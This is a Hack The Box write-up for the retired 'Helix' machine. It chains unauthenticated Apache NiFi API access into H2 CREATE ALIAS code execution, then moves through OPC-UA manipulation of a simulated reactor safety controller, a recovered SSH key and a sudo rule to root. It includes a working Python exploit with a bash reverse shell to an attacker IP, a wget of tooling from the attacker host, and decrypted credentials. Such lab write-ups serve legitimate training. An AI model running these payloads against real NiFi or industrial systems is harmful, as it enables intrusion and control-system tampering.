# Helix

**Target:** HTB Machine (retired 2026-08-08)
**Difficulty:** Medium
**OS:** Linux (Ubuntu 22.04.5 LTS, kernel 5.15.0-164-generic)

---

## Skills Required

- **Apache NiFi flow architecture and REST API** — NiFi's processor/
  controller-service model and how its REST API exposes flow configuration
  for read/write. [Official REST API reference](https://nifi.apache.org/docs/nifi-docs/rest-api/index.html)
- **H2 embedded database Java UDFs** — `CREATE ALIAS ... AS $$ <java> $$`
  compiles and runs arbitrary Java inside the host JVM. [H2 `CREATE ALIAS` docs](https://www.h2database.com/html/commands.html#create_alias)
- **OPC-UA industrial protocol fundamentals** — address-space browsing,
  NodeIds, UserIdentityTokens. [OPC Foundation online reference](https://reference.opcfoundation.org/)
- **Linux sudoers / NOPASSWD privilege escalation analysis** — reading
  `sudo -l` output and mapping a granted binary to its actual escalation
  potential. [GTFOBins](https://gtfobins.github.io/)
- **systemd service and timer unit analysis** — reading unit files/
  `systemctl list-timers` to understand what's scheduled and as whom.
  [`systemd.timer(5)` man page](https://man7.org/linux/man-pages/man5/systemd.timer.5.html)
- **TOCTOU race condition concepts** — exploiting the gap between a
  security-relevant check and its use. [OWASP: Race Conditions](https://owasp.org/www-community/pages/vulnerabilities/race_conditions)
- **PBKDF2 / AES-GCM key derivation and authenticated encryption** —
  needed to reverse NiFi's sensitive-property encryption scheme.
  [RFC 8018 (PKCS #5 v2.1)](https://www.rfc-editor.org/rfc/rfc8018)
- **OpenSSH private key handling** — parsing/validating an `id_ed25519`-
  style key file. [`ssh-keygen(1)` man page](https://man.openbsd.org/ssh-keygen.1)

## Recon

Full TCP port sweep, then a targeted version scan:

```
$ nmap -p- -Pn 10.129.245.123 --open
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -p 22,80 -sC -sV -Pn 10.129.245.123
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Only two ports, and port 80 redirected to `helix.htb` — enough of a signal
by itself to add the hostname to `/etc/hosts` and start looking for
Host-header-routed vhosts rather than trusting the root page alone. Ran a
subdomain sweep against that domain:

```
$ ffuf -u http://10.129.245.123 -H "Host: FUZZ.helix.htb" -w subdomains-top1million-5000.txt
```

Most guesses (`webdisk`, `old`, `mail`, `webmail`, `autodiscover`) just
redirected back to the main site, but `flow.helix.htb` returned a distinct
response — Apache NiFi 1.21.0. NiFi's `/nifi-api/access/config` endpoint is
the standard first check on any NiFi instance (it tells you outright
whether login is even required):

```
$ curl -s -H "Host: flow.helix.htb" http://10.129.245.123/nifi-api/access/config
{"config":{"supportsLogin":false}}
```

`supportsLogin: false` means there's no login flow configured at all — the
anonymous identity is the *only* identity, and it gets whatever access
policy NiFi's admin assigned as default. Every REST endpoint tested
(`/system-diagnostics`, `/flow/about`, `/controller/config`,
`/flow/process-groups/root`, the controller-services listing) came back
`200` with no auth header of any kind, and the flow's own
`canRead`/`canWrite` permission flags were both `true` — this is a
full read/write, unauthenticated management API, not just an information
leak.

Pulling the actual flow confirmed why this mattered specifically:

```
$ curl -s -H "Host: flow.helix.htb" http://10.129.245.123/nifi-api/flow/process-groups/f203bc07-019b-1000-516b-eaedd48609d1/controller-services
{
  "name": "MaintenanceDB",
  "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
  "properties": {
    "Database Connection URL": "jdbc:h2:mem:maint;MODE=MySQL;DB_CLOSE_DELAY=-1",
    "Database Driver Class Name": "org.h2.Driver",
    "Database User": "operator",
    "Password": "********"
  },
  "permissions": {"canRead": true, "canWrite": true}
}
```

An `ExecuteSQL` processor (id `f4797168-019b-1000-2229-6c29fab7ba7c`) is
wired to this H2 controller service. H2 supports compiling and running
arbitrary Java from SQL (`CREATE ALIAS ... AS $$ <java> $$`) — combined
with unauthenticated write access to that processor's SQL properties, this
is a direct path to code execution, not just credential exposure. That's
what made this the clear first vector over anything else on the (very
thin) rest of the attack surface.

Putting the whole picture together before moving to Foothold: two ports, a
static marketing site that's a dead end, and one exposed management API
that hands over full read/write with a known database username baked in.
The working theory was simple — unauthenticated NiFi RCE gets an initial
foothold, and the `operator` username sitting in that DBCP config points
straight at a real OS account to pivot into, most plausibly via that same
password once decrypted. That first half held up exactly as expected;
whether the second half would be that clean was the open question heading
into Foothold.

---

## Foothold

### Vulnerability class

Unauthenticated configuration-write access to a NiFi flow, chained into
H2's built-in Java-compilation feature. Two things both have to be true,
and both are true here:

1. NiFi's login being disabled hands the anonymous identity full read/write
   on every REST resource (a deployment choice, not a NiFi bug).
2. `ExecuteSQL` exposes a `sql-pre-query` property that accepts arbitrary
   SQL by design (a legitimate "run setup SQL before the main query"
   feature) — since anonymous can write processor properties, anonymous
   can put an H2 `CREATE ALIAS`/`CALL` payload there.

### CVE research and patch-diff analysis

The obvious CVE candidate for this exact build (`nifi-1.21.0-RC2`, build
date `04/03/2023`) is **CVE-2023-34468**, which affects
`DBCPConnectionPool`/`HikariCPConnectionPool` from NiFi 0.0.2 through
1.21.0 — this box runs the last vulnerable version. Rather than take the
advisory's word for the mechanism, I pulled the actual fix:

```
$ gh api "repos/apache/nifi/contents/nifi-nar-bundles/nifi-extension-utils/nifi-dbcp-base/src/main/java/org/apache/nifi/dbcp/utils/DBCPProperties.java?ref=rel/nifi-1.21.0" -q .content | base64 -d > DBCPProperties_1.21.0.java
$ gh api "repos/apache/nifi/contents/nifi-nar-bundles/nifi-extension-utils/nifi-dbcp-base/src/main/java/org/apache/nifi/dbcp/utils/DBCPProperties.java?ref=rel/nifi-1.22.0" -q .content | base64 -d > DBCPProperties_1.22.0.java
$ diff -u DBCPProperties_1.21.0.java DBCPProperties_1.22.0.java
--- DBCPProperties_1.21.0.java
+++ DBCPProperties_1.22.0.java
@@ -20,6 +20,7 @@
 import org.apache.nifi.components.PropertyValue;
 import org.apache.nifi.components.resource.ResourceCardinality;
 import org.apache.nifi.components.resource.ResourceType;
+import org.apache.nifi.dbcp.ConnectionUrlValidator;
 import org.apache.nifi.dbcp.DBCPValidator;
 import org.apache.nifi.expression.ExpressionLanguageScope;
 import org.apache.nifi.kerberos.KerberosUserService;
@@ -37,7 +38,7 @@
             .description("A database connection URL used to connect to a database. May contain database system name, host, port, database name and some parameters."
                     + " The exact syntax of a database connection URL is specified by your DBMS.")
             .defaultValue(null)
-            .addValidator(StandardValidators.NON_EMPTY_VALIDATOR)
+            .addValidator(new ConnectionUrlValidator())
             .required(true)
             .expressionLanguageSupported(ExpressionLanguageScope.VARIABLE_REGISTRY)
             .build();
```

`ConnectionUrlValidator` (new in 1.22.0) rejects any newly-written
"Database Connection URL" value starting with `jdbc:h2` outright. **What
that closes:** an attacker pointing a *new* controller service at an
attacker-supplied H2 URL (e.g. one carrying an `INIT=` parameter for
instant RCE on connect). **What it doesn't touch at all:** `ExecuteSQL`'s
own `sql-pre-query`/`SQL select query` properties, which accept arbitrary
SQL text by design and are never routed through `ConnectionUrlValidator`.
On this box, the H2 `MaintenanceDB` service is already pre-provisioned by
the application itself — my actual exploit never wrote to the Connection
URL property at all, only to `sql-pre-query`. So CVE-2023-34468 is a real,
correctly version-matched CVE, but it is **not** the mechanism I used, and
patching it (upgrading to 1.22.0+) would leave this exact box fully
exploitable — the real root cause is anonymous full read/write on the API,
not the specific H2-URL-injection bug.

### Exploit steps

Found the processor id/current revision, then set `sql-pre-query` to a
single batched `CREATE ALIAS` + `CALL`:

```python
import json, urllib.request
BASE = "http://10.129.245.123/nifi-api"
HOST = "flow.helix.htb"
PROC_ID = "f4797168-019b-1000-2229-6c29fab7ba7c"

pre_query = (
    'CREATE ALIAS IF NOT EXISTS PWN AS $$ '
    'String pwn() throws java.io.IOException { '
    'Runtime.getRuntime().exec(new String[]{"bash","-c",'
    '"bash -i >& /dev/tcp/10.10.14.46/4444 0>&1"})\; '
    'return "ok"\; '
    '} $$ ; '
    'CALL PWN()'
)
body = {
    "revision": {"version": 9},
    "component": {"id": PROC_ID, "config": {"properties": {
        "sql-pre-query": pre_query, "SQL select query": "SELECT 1"
    }}}
}
req = urllib.request.Request(f"{BASE}/processors/{PROC_ID}",
    data=json.dumps(body).encode(), method="PUT",
    headers={"Content-Type": "application/json", "Host": HOST})
with urllib.request.urlopen(req) as resp:
    print(json.loads(resp.read())["revision"])
```

**Two non-obvious gotchas hit before this worked.** First, splitting the
`CREATE ALIAS` and `CALL` across the pre-query and main-query properties
failed every time with `Function "PWN" not found`, even though the
pre-query itself reported no error — each property runs in its own
session context as far as the alias's visibility goes, so both statements
have to be in the *same* property. Second, a literal `;` used to terminate
a Java statement inside the `$$ ... $$` block gets treated by NiFi's own
pre-query splitter as a SQL statement separator (it doesn't understand H2's
quoting rules), silently truncating the `CREATE ALIAS` body — escaping
every such `;` as `\;` avoids the split without changing what H2 actually
compiles.

Started the processor at the new revision, caught the shell, then
immediately stopped it again (a `TIMER_DRIVEN` processor with no incoming
connection free-runs continuously and will keep spawning shells while
hammering an already-88%-full disk otherwise):

```
$ curl -s -H "Host: flow.helix.htb" -X PUT \
  http://10.129.245.123/nifi-api/processors/f4797168-019b-1000-2229-6c29fab7ba7c/run-status \
  -H "Content-Type: application/json" -d '{"revision":{"version":10},"state":"RUNNING"}'
```
```
listening on [any] 4444 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.245.123] 51478
bash: cannot set terminal process group (978): Inappropriate ioctl for device
bash: no job control in this shell
nifi@helix:/opt/nifi-1.21.0$ id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```

Full reusable exploit: `Tooling and Scripts/exploits/helix/nifi_h2_createalias_rce.py`
(and see [[nifi-unauthenticated-h2-createalias-rce]] for the generalized
version of this technique).

### What the shell handed over

A real login account, `operator` (uid 1001), sitting right next to the
service account we landed as — an obvious lateral-movement target the
moment `/etc/passwd` was checked:

```
nifi@helix:/opt/nifi-1.21.0$ cat /etc/passwd | grep -E "sh$|bash"
root:x:0:0:root:/root:/bin/bash
operator:x:1001:1001::/home/operator:/bin/bash
```

This confirmed half of the working theory from Recon — the `operator`
username already known from the DBCP config mapped onto a real,
login-capable OS account, exactly the pivot target the recon notes had
flagged as the most likely route to root.

The `MaintenanceDB` password masked in the API response is stored
encrypted in `flow.xml.gz`, and the decryption key sits in plaintext right
next to it in `nifi.properties` — both readable as `nifi`:

```
nifi@helix:/opt/nifi-1.21.0$ zcat conf/flow.xml.gz | grep -A3 -B3 "operator\|password"
      <name>Database User</name><value>operator</value>
      <name>Password</name><value>enc{22f839f25c10bc37b1f250afc85788e5d83783c63d7d1aceeb76dd26b5eaea05173d1941fb02129d61947c2481922191035f}</value>

nifi@helix:/opt/nifi-1.21.0$ grep -i "sensitive.props" conf/nifi.properties
nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
```

This handed off two concrete leads for privesc: decrypt that value (see
[[nifi-sensitive-properties-decryption]]) and try it against `operator`,
and figure out what `operator`'s account is actually for.

---

## Privesc (nifi → operator)

### Enumerating past the obvious checklist

Standard local-privesc checks (`sudo -n -l`, SUID binaries, `getcap -r /`,
cron/systemd timers, kernel version) all came back clean — nothing custom,
and the kernel (`5.15.0-164-generic`, Nov 2025 patch level) was recent
enough that chasing a kernel LPE looked like a worse bet than the box's own
much more developed custom attack surface. `ps auxf` is what actually
opened the box up — routine process enumeration surfaced an entire second
application stack simulating an industrial reactor:

```
nifi@helix:/opt/nifi-1.21.0$ ps auxf | grep -i helix
plc         1418  ... /opt/helix/bin/helix-plc
root        1420  ... /opt/helix/bin/helix-safety
www-data    1423  ... /opt/helix/bin/helix-hmi

nifi@helix:/opt/nifi-1.21.0$ ss -ntlp
LISTEN 0 128       127.0.0.1:8081     # helix-hmi web dashboard
LISTEN 0 100       127.0.0.1:4840     # OPC-UA server (helix-plc)
```

`helix-safety` running as **root**, loopback-bound, `systemd`-managed with
`Restart=always`, is exactly the kind of local attack surface worth
pursuing from a foothold — "bound to 127.0.0.1" is not a security boundary
once you already have a shell on the box. This is the point where the
working theory from Recon needed revising: the plan hadn't accounted for a
second application stack at all — reaching `operator` wasn't going to be a
plain credential-reuse problem, it ran through an entirely separate OT/ICS
simulation with its own gating logic. No `socat`/`ncat` was on target,
so I wrote a stdlib-only TCP relay and served it from the attacker box to
expose the OPC-UA port externally:

```
nifi@helix:/tmp$ wget -q http://10.10.14.46:8000/tcp_relay.py -O /tmp/relay.py
nifi@helix:/tmp$ nohup python3 /tmp/relay.py 14840 4840 > /tmp/relay.log 2>&1 & disown
```

### The Privileged Maintenance Window

The HMI dashboard (readable directly with `curl`, no relay needed) spelled
out the actual mechanism in plain text:

```
nifi@helix:/tmp$ curl -s http://127.0.0.1:8081/
<h2>Privileged Maintenance Window</h2>
<p>Status: <b>CLOSED</b></p>
<p><small>This window is granted by the safety controller only when a
hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥
73 bar) while still below trip.</small></p>
```

Enumerating the OPC-UA address space that drives this needed a
non-default browse strategy — `get_children()` from the standard
`ObjectsFolder` only found 2 of the 3 real top-level custom objects,
missing `Plant` (the actual namespace root) entirely, because the server
links its own objects with a reference type outside `get_children()`'s
default hierarchical-refs filter. Brute-forcing `ns=2;i=1..14` numeric
NodeIds directly found the complete address space instead — 8 writable
Variables (see [[opcua-numeric-nodeid-bruteforce-and-decorative-auth]] for
the general technique).

Reproducing the HMI's own stated trigger condition by iterating on those
writable fields (this was empirical trial-and-error against the documented
behavior, not derived from any spec or source — worth being explicit about,
since the box gives you the *what* on the dashboard but not the *how*)
found the exact combination:

```
$ opcua_toolkit.py write opc.tcp://10.129.245.123:14840/helix/ 2 \
    12:MAINTENANCE:string 13:true:bool 6:14.0:float
wrote ns=2;i=12 = 'MAINTENANCE'   # Mode — 'TEST' alone does NOT open the window
wrote ns=2;i=13 = True            # TestOverride
wrote ns=2;i=6  = 14.0            # CalibrationOffset, pushes Temperature into
                                   # the 295-~300°C hazardous-but-below-trip band
```
```
$ curl -s http://127.0.0.1:8081/ | grep -A3 'Privileged Maintenance'
<h2>Privileged Maintenance Window</h2>
<p>Status: <b>OPEN</b> <small>(~109s)</small></p>
```

### The actual target of all this

```
nifi@helix:/tmp$ ls -la /usr/local/sbin/
-rwxr-x---  1 root operator     932 Jan 25 19:12 helix-maint-console
nifi@helix:/tmp$ ls -la /etc/sudoers.d/
-r--r-----  1 root root   66 Jan 25 19:12 helix-maint
```

`helix-maint-console` is executable only by the `operator` group (whose
sole member is the `operator` user), with a dedicated sudoers rule backing
it — no setuid bit, so it has to run as root via `sudo`. This made
`operator` the confirmed, singular target: obtaining its credential opens
a direct, already-understood escalation path. What it *doesn't* do is grant
`/opt/helix` traversal (`operator` isn't in the `helixsvc` group) — the
account's entire value is this one sudo rule.

### Where the credential search stalled

The cryptographically-recovered `MaintenanceDB` password
(`R7qZ9L3xKM2W8pFYcA`, decrypted per
[[nifi-sensitive-properties-decryption]] — AES-GCM tag verification
succeeding is itself proof the plaintext is correct, not a guess) did
**not** work for `operator`, tested over two independent channels to rule
out any terminal/FIFO artifact:

```
nifi@helix:/tmp$ printf "%s\n" "R7qZ9L3xKM2W8pFYcA" | su operator -c "id"
Password: su: Authentication failure
```
```python
c.connect('10.129.245.123', username='operator', password='R7qZ9L3xKM2W8pFYcA', ...)
# Authentication failed.
```

NiFi's own audit database confirmed why: the DB user was renamed from
`maint` to `operator` with a fresh password at the same instant
(2026-01-25), so the recovered credential genuinely is the current DBCP
password — it's simply never shared with the OS account. This overturned
the second half of the working theory from Recon outright: recovering the
DBCP password correctly did not translate into `operator`'s login
credential, contrary to the original assumption that one decrypted secret
would bridge both accounts. Extensive filesystem searches, a live poll of
the maintenance-window file for permission changes, and a full CVE-breadth
pass across every component in the stack (fingerprinting each one's real
version first, rather than assuming) all came back negative. The complete
accounting of this — and the one search gap that mattered — is in Rabbit
Holes below.

### The actual missing piece

The unblock came from a concrete, specific, testable claim relayed from a
paid third-party writeup (thecybersecguru), reached for only after
independent effort on this exact problem had been genuinely exhausted —
verified live at every step rather than trusted on its word:

```
nifi@helix:/opt/nifi-1.21.0$ ls -la /opt/nifi-1.21.0/support-bundles/
-rw-r-----  1 nifi nifi  411 Jan 25  2026 operator_id_ed25519.bak

nifi@helix:/opt/nifi-1.21.0$ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
...
-----END OPENSSH PRIVATE KEY-----
```

A file readable by the `nifi` foothold the whole time, owned by
`nifi:nifi`, containing a genuine unencrypted OpenSSH ed25519 private key
(header bytes decode to cipher `none`/KDF `none` — no passphrase). Parsed
cleanly, no prompt:

```
$ ssh-keygen -y -f /tmp/helix_key/operator_id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOi4R6+1dAvmm4wQ9DMwYSj8tKtsROxZUMfwHjVUc1s7 root@management
```
```
$ ssh -i /tmp/helix_key/operator_id_ed25519 operator@10.129.71.88 "id; cat /home/operator/user.txt"
uid=1001(operator) gid=1001(operator) groups=1001(operator)
69f8d409418082801e000c97cf5c5d2e
```

This confirmed the Recon theory was directionally right even though the
specific mechanism wasn't: `operator`'s credential really was recoverable
from something `nifi` could already read, just an SSH key backup sitting
in NiFi's own support-bundle directory rather than the DBCP password.

---

## Root (operator → root)

```
$ ssh -i /tmp/helix_key/operator_id_ed25519 operator@10.129.71.88 "sudo -n -l"
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Confirms the earlier inference (`NOPASSWD`, gated on the maintenance
window) was correct — the sudoers rule text had never been directly
readable before reaching `operator`. The console genuinely refuses when
the window is closed:

```
$ sudo -n /usr/local/sbin/helix-maint-console
Maintenance window CLOSED.
```

Retriggered the window with the already-proven OPC-UA `CalibrationOffset`
ramp (`operator` has `asyncua` installed locally, so no relay or offline
packaging needed this time — it's a real local login, not a restricted
foothold shell), then ran the console during the ~120s open window:

```
$ echo 'cat /root/root.txt' | sudo -n /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 53 seconds
1f414028f2593bb1afdb77f586f08b81
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

`root.txt` captured. While inside a live root shell, read the console
script's own source to confirm the exact mechanism directly rather than
just the outcome:

```bash
#!/bin/bash
set -euo pipefail
FLAG="/opt/helix/state/maintenance_window"
window_ok() {
  [ -f "$FLAG" ] || return 1
  until_ts="$(cat "$FLAG" 2>/dev/null || true)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
}
if ! window_ok; then echo "Maintenance window CLOSED."; exit 1; fi
SCOPE="helix-maint-$$"
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group \
  --property=SendSIGHUP=yes /bin/bash -p -i
```

The entire gate is a plain integer-timestamp comparison against a file
`helix-safety` (root) writes when it detects the hazardous-but-below-trip
condition — no PAM module, no additional check, and the `sudo` step itself
is unconditional `NOPASSWD`. `/proc/self/cgroup` inside the shell
(`/system.slice/helix-maint-3346.scope`) confirms the `systemd-run --scope`
mechanism matches the script's own `SCOPE="helix-maint-$$"` naming.

**Full chain:** unauthenticated NiFi API → H2 `CREATE ALIAS` RCE as `nifi`
→ read `support-bundles/operator_id_ed25519.bak` → SSH as `operator` →
OPC-UA `CalibrationOffset` ramp opens the maintenance window → `sudo
/usr/local/sbin/helix-maint-console` → root.

---

## Rabbit Holes

**OPC-UA username testing looked like it revealed real distinct accounts —
it didn't.** The server advertises a username/password login policy, and
testing the decrypted DBCP password against several plausible names
(`operator`, `plc`, `admin`, `engineer`) all reported success, which looked
like confirmation those were real, separately-provisioned identities.
Testing a deliberately nonsense pair (`foo:bar`) closed this immediately —
it also "worked," proving the server validates nothing at all. Later
cross-checked against `/etc/passwd`: `operator` was the *only* one of those
names that was ever a real OS account. Generalized in
[[opcua-numeric-nodeid-bruteforce-and-decorative-auth]].

**The decrypted `MaintenanceDB` password was the single most substantive
false lead on this box.** It was cryptographically proven correct (AES-GCM
tag verification is not a guess), tested against `operator` over two
independent channels (`su`, a fresh `paramiko` SSH connection) to rule out
any FIFO/terminal artifact, and also tried against `plc` and `root` since
the audit log showed the DB user had briefly been named `maint`. All
failed. Closed definitively, not just abandoned: NiFi's own audit-history
DB (`nifi-flow-audit.mv.db`, opened read-only via the framework's internal
`nf`/`nf` credential) showed the DB user was renamed `maint`→`operator`
with a brand-new password at the same instant on 2026-01-25 — the recovered
credential genuinely is the current, correct DBCP secret, it's just never
shared with the OS account. (The first attempt at this query used wrong
column names and silently produced a syntax error rather than a real
negative result — a genuine methodological gap, later caught and re-run
with the schema confirmed via `INFORMATION_SCHEMA.COLUMNS`, reaching the
same conclusion but now on solid ground.)

**Filesystem-wide credential searches declared "nothing" too early — this
is the actual near-miss.** Multiple broad searches ran `find / -iname
"id_rsa*" -o -iname "*.pem" -o -iname "*.ppk"` and swept `/var/backups`,
`conf/archive`, `content_repository`/`provenance_repository`, and other
specific paths, all coming back empty, and that was treated as "no SSH key
exists on this box reachable from `nifi`." What none of those searches
did — despite being genuinely broad — was individually enumerate NiFi's
own `support-bundles/` subdirectory, and the actual key
(`operator_id_ed25519.bak`) doesn't match any of `id_rsa*`/`*.pem`/`*.ppk`
at all — a `.bak` extension on a descriptively-named file was simply
outside every pattern tried. The lesson isn't "search harder," it's that a
filename-pattern search is only as good as its pattern list, and a
service's own working directories (here, NiFi's, since we were *inside*
NiFi's own foothold) deserve directory-by-directory listing, not just
pattern-matched find.

**The OPC-UA TOCTOU race against `helix-safety` was the most
engineering-intensive dead end, and the most conclusively closed.**
Discovered via a side effect of reading `helix-cleanup.sh`'s behavior (see
[[proc-cmdline-world-readable-behavior-inference]]): the script restarts
`helix-plc` (the real OPC-UA server) and then `helix-safety` (a root-owned
OPC-UA *client*) only ~83ms apart, every 5 minutes. If `helix-safety`
authenticated with a real, non-anonymous OPC-UA identity, winning that
83ms window with a fake server would recover it directly. Built one
(build-the-server-object-once, tight-loop only the bind/stop cycle,
~249 attempts/second — see
[[service-restart-toctou-port-rebind-credential-capture]] for the general
pattern), including offline-packaging `asyncua`'s compiled dependencies for
the target's Python 3.10 since it has no internet egress. Won the race and
captured three real `ActivateSession` handshakes — **all anonymous, no
username, password, or certificate presented.** This is hard, direct
evidence (not an inference from absent files) that the credential isn't
embedded in `helix-safety`'s own client config, closing what had looked
like the single most promising remaining lead.

**`/var/log/laurel/audit.log` and its config were a real detour, resolved
cleanly.** A line in `/etc/laurel/config.toml`
(`label-script."^/root/maint-.*[.]sh$" = "maint"`) initially looked like a
box-specific customization mirroring the `helix-maint-*` naming — pulling
laurel's actual upstream default config from GitHub showed it's stock
boilerplate, byte-for-byte identical, not a customization at all. The audit
log itself showed a `+` in `ls -la` (indicating a POSIX ACL), which could
have meant a hidden read grant — decoded the ACL directly from its
`system.posix_acl_access` xattr (no `getfacl`/`setfacl` installed) and
confirmed it's just the base permission bits re-expressed with a mask, no
named user/group entry. A properly locked-down, unmodified pipeline, not a
misconfiguration — worth the direct verification rather than assuming from
the `+` alone.

---

## Skills Learned

- Unauthenticated NiFi REST API abuse → H2 `CREATE ALIAS` Java RCE via
  `ExecuteSQL`'s `sql-pre-query` property
- NiFi `sql-pre-query` statement-splitter quirk (escaping `;` inside a
  dollar-quoted Java block)
- Patch-diff analysis distinguishing a CVE's actual fixed scope from a
  box's real, still-open attack surface
- Reverse-engineering and offline-decrypting NiFi's
  `NIFI_PBKDF2_AES_GCM_256` sensitive-property scheme from source
- Pivoting a loopback-bound service out through a foothold with a
  stdlib-only Python TCP relay (no socat/ncat on target)
- OPC-UA numeric-NodeId brute-force enumeration around a
  hierarchical-reference blind spot in `get_children()`
- Identifying "decorative" (accept-anything) OPC-UA authentication
- Empirical trigger-condition discovery against a simulated ICS safety
  controller via its own writable state variables
- Reading a root-owned, permission-denied script's real behavior via
  world-readable `/proc/*/cmdline` polling across a live timer trigger
- Decoding a POSIX ACL directly from its `system.posix_acl_access` xattr
  when `getfacl`/`setfacl` aren't installed
- Winning a sub-100ms TOCTOU race against a systemd-timer-driven service
  restart to capture (or disprove) a privileged client's own credential
  handshake
- Offline cross-Python-version dependency packaging (`pip download
  --platform manylinux2014_x86_64 --python-version 310`) to install a
  library on a target with no internet egress and no matching local
  interpreter
- `sudoers` `NOPASSWD` gated purely on a state-file timestamp, dropping to
  root via `systemd-run --scope`

## Lessons Learned

- **`supportsLogin: false` on any management API (NiFi or otherwise) means
  "no login flow," not "no access control gap" — check what the default,
  no-identity access policy actually grants** before assuming an
  unauthenticated instance is merely a read-only information leak. On this
  box it was full read/write on every resource, which is what turned a
  data-pipeline tool into direct RCE.
- **A version-matched CVE is a claim about a specific code path, not proof
  the whole vulnerability class was exploited that way** — CVE-2023-34468
  matched this exact NiFi build perfectly and still wasn't the mechanism
  used; the real path (`ExecuteSQL`'s `sql-pre-query`) sat entirely outside
  what that CVE's patch touches. Always confirm which specific property/
  code path an exploit actually goes through before citing a CVE as "the"
  vulnerability.
- **A cryptographically-correct credential recovery doesn't imply the
  credential is portable across trust boundaries.** The DBCP password was
  provably, unambiguously correct and still wasn't the OS account's
  password — treat "recovered correctly" and "reusable elsewhere" as two
  separate claims that each need their own test.
- **A filename-pattern-based credential search is only as complete as its
  pattern list** — `id_rsa*`/`*.pem`/`*.ppk` are reasonable defaults but
  don't cover every real key naming convention (`.bak` on a descriptive
  name, here). Once inside a specific service's own foothold, a
  directory-by-directory listing of that service's own working
  directories is worth doing even after a broad pattern search comes back
  clean.
- **"Loopback-bound" and "decorative auth" are both non-boundaries once a
  foothold exists** — a root-owned service bound to 127.0.0.1 is still
  attack surface, and an OPC-UA (or any protocol's) login policy that
  "accepts" several plausible usernames is worth testing with garbage
  credentials before treating those logins as evidence of distinct real
  accounts.
- **A TOCTOU race can be used defensively, as a diagnostic, not just
  offensively** — winning the race here didn't produce a credential, it
  definitively disproved one hypothesis (an embedded client credential)
  with the client's own real wire traffic, which is stronger evidence than
  any amount of filesystem searching or absence-of-evidence reasoning.
- **World-readable `/proc/*/cmdline`/`status` is a real side channel for
  understanding another user's unreadable script**, distinct from
  `ptrace_scope`-gated `cwd`/`exe`/`maps` — worth checking the split
  explicitly (a known-root-owned PID like `/proc/1`) before assuming a
  permission-denied file is a total black box.
- **Accepting a relayed third-party lead for a genuinely stuck engagement
  is legitimate, but only after independent effort is real and
  exhausted, and only if verified live at every step** — I didn't just
  trust the claim, I re-derived and confirmed each piece (the file's
  existence, its unencrypted-key format, the SSH auth, and the exact
  sudoers/systemd-run mechanism) against the live box before calling it
  done.

**Tooling/technique notes extracted from this box:**
[[nifi-unauthenticated-h2-createalias-rce]],
[[nifi-sensitive-properties-decryption]],
[[opcua-numeric-nodeid-bruteforce-and-decorative-auth]],
[[service-restart-toctou-port-rebind-credential-capture]],
[[proc-cmdline-world-readable-behavior-inference]],
[[reverse-shell-fifo-interaction]] (updated with two new failure modes hit
on this box).
